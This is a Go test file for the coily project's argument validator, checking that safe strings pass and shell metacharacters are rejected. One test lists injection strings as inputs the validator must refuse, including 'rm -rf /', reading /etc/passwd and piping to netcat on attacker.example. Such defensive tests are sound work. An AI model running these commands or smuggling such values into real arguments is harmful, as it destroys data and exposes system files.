package policy_test

import (
	"errors"
	"strings"
	"testing"

	"github.com/coilysiren/coily/pkg/policy"
)

func TestValidateArg_AcceptsSafeStrings(t *testing.T) {
	cases := []string{
		"",
		"simple",
		"with-hyphens",
		"with.dots",
		"with/slashes",
		"with:colons",
		"Mixed_Case",
		"/path/to/thing.yaml",
		"arn:aws:iam::1234:user/kai-mac-laptop",
		"Z06714552N3MO04UBWF33",
		"https://github.com/coilysiren/coily",
		"/eco/server-api-token",
	}
	for _, c := range cases {
		if err := policy.ValidateArg("test", c); err != nil {
			t.Errorf("ValidateArg(%q) = %v, want nil", c, err)
		}
	}
}

func TestValidateArg_RejectsEveryShellMetacharacter(t *testing.T) {
	for _, r := range policy.ShellMeta {
		value := "ok" + string(r) + "bad"
		err := policy.ValidateArg("test", value)
		if err == nil {
			t.Errorf("ValidateArg(%q) = nil, want error (char %q)", value, r)
			continue
		}
		if !errors.Is(err, policy.ErrShellMeta) {
			t.Errorf("ValidateArg(%q): err = %v, want ErrShellMeta", value, err)
		}
	}
}

func TestValidateArg_RejectsInjectionAttempts(t *testing.T) {
	cases := []string{
		"foo; rm -rf /",
		"foo && cat /etc/passwd",
		"foo | nc attacker.example 4444",
		"$(whoami)",
		"`whoami`",
		"foo > /tmp/out",
		"foo \n rm -rf /",
	}
	for _, c := range cases {
		if err := policy.ValidateArg("test", c); err == nil {
			t.Errorf("ValidateArg(%q) accepted injection attempt", c)
		}
	}
}

func TestValidateArgs_FirstViolationWins(t *testing.T) {
	args := map[string]string{
		"safe":   "ok",
		"unsafe": "foo;bar",
	}
	if err := policy.ValidateArgs(args); err == nil {
		t.Error("ValidateArgs accepted unsafe input")
	}
}

func TestValidateArgSlice_IncludesIndexInErrorMessage(t *testing.T) {
	err := policy.ValidateArgSlice("pos", []string{"ok", "bad;injection"})
	if err == nil {
		t.Fatal("expected error")
	}
	if !strings.Contains(err.Error(), "pos[1]") {
		t.Errorf("error = %q, want it to contain %q", err.Error(), "pos[1]")
	}
}
